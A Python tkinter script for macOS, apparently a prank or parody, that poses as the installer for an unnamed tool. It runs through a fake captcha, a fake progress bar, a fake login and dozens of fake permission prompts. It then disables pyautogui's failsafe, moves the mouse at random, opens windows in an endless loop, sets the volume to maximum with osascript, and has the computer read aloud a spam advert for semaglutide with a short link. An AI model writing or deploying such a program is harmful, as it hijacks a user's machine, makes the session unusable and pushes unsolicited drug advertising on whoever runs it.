import tkinter as tk
from random import randint
from time import sleep
from tkinter import messagebox as mb
from tkinter import ttk
import pyautogui as pag
import subprocess as sp
from threading import Thread


def step1():
    win = tk.Toplevel(root)
    tk.Label(win, text='欢迎安装某某某工具', font=('Arial', 40)).pack(padx=20, pady=10)
    tk.Button(win, text='立即安装', command=lambda: step2(win), font=('Arial', 30)).pack(padx=20, pady=10, fill=tk.X, expand=True)
    win.bind('<Control-Shift-F2>', lambda event: step2(win))
    win.bind('<Control-Shift-F3>', lambda event: step3(win))
    win.bind('<Control-Shift-F4>', lambda event: step4(win))
    win.bind('<Control-Shift-F5>', lambda event: step5(win))
    win.bind('<Control-Shift-F6>', lambda event: step6())


def step2(win):
    def step2_ok():
        if var.get() == 2847:
            step3(win)
        else:
            mb.showwarning('不行', '不是2847')

    win.destroy()
    win = tk.Toplevel(root)
    tk.Label(win, text='我们需要验证您是不是机器人', font=('Arial', 40)).pack(padx=20, pady=10)
    tk.Label(win, text='请拖出2847', font=('Arial', 30)).pack(padx=20, pady=10)
    var = tk.IntVar()
    scale = tk.Scale(win, from_=1000, to=5000, orient=tk.HORIZONTAL, length=500, width=30, variable=var)
    scale.pack(padx=20, pady=10)
    tk.Button(win, text='验证', command=step2_ok, font=('Arial', 30)).pack(padx=20, pady=10, fill=tk.X, expand=True)


def step3(win):
    win.destroy()
    win = tk.Toplevel(root)
    progess = tk.IntVar()
    tk.Label(win, text='Installing...', font=('Arial', 40)).pack(padx=20, pady=10)
    ttk.Progressbar(win, variable=progess, length=400, maximum=100).pack(padx=20, pady=10)
    step3_run(progess, win)


def step3_run(progess, win):
    for i in range(0, 101):
        progess.set(i)
        root.update()
        sleep(0.05)
    root.after(200, step4, win)


def step4(win):
    win.destroy()
    win = tk.Toplevel(root)
    tk.Label(win, text='请先登录', font=('Arial', 40)).pack(padx=20, pady=10)
    tk.Label(win, text='未登录将自动注册', font=('Arial', 30)).pack(padx=20, pady=10)
    tk.Scale(win, from_=100000, to=99999999999, label='手机号', length=700, orient=tk.HORIZONTAL, width=30).pack(padx=20, pady=10)
    tk.Entry(win, width=70, highlightbackground='white').pack(padx=20, pady=10)
    tk.Button(win, text='完成', font=('Arial', 30), command=lambda: step5(win)).pack(padx=20, pady=10, fill=tk.X, expand=True)


def step5(win):
    win.destroy()
    authorities = '麦克风,相机,定位服务,完全磁盘访问,文件与文件夹,蓝牙,本地网络,输入监控,无障碍,App管理,远程桌面,录屏与系统录音,硬件连接,终端,后台运行,系统服务,root,弹出式窗口,重定向,跟踪,剪贴板,修改系统设置,唤醒,电源测量,通知监听,通知,自动播放,共享数据'.split(',')
    for authority in authorities:
        mb.askyesno('提示', '"某某某工具"想要使用"%s"权限' % authority)
        sleep(0.3)
    pag.FAILSAFE = False
    pag.PAUSE = 0
    pag.moveTo(100, 100)
    step6()


def step6():
    volume = 100
    Thread(target=lambda: sp.run(['say', '诺和忻司美格鲁肽片，原研好药，下单即送血糖仪套装，赠完即止，戳3.cn/v/pt7GYf']), daemon=True).start()
    for _ in range(50):
        win = tk.Toplevel(root)
        tk.Label(win, text='欢迎使用某某某工具', font=('Arial', 40)).pack(padx=20, pady=10)
        win.focus_force()
        w, h = win.winfo_screenwidth(), win.winfo_screenheight()
        pag.moveTo(randint(0, w), randint(0, h))
        win.update()
        Thread(target=lambda: sp.run('osascript -e "set volume output volume %d"' % volume, shell=True), daemon=True).start()
        root.update()
    while True:
        for i in range(50):
            win = tk.Toplevel(root)
            tk.Label(win, text='欢迎使用某某某工具', font=('Arial', 40)).pack(padx=20, pady=10)
            win.focus_force()
            w, h = win.winfo_screenwidth(), win.winfo_screenheight()
            win.update()
        sp.run('osascript -e "set volume output volume %d"' % volume, shell=True)
        sp.run(['say', '-r', '250', '诺和忻司美格鲁肽片，原研好药，下单即送血糖仪套装，赠完即止，戳3.cn/v/pt7GYf'])


root = tk.Tk()
root.focus_force()
root.withdraw()

root.after(100, step1)

root.mainloop()
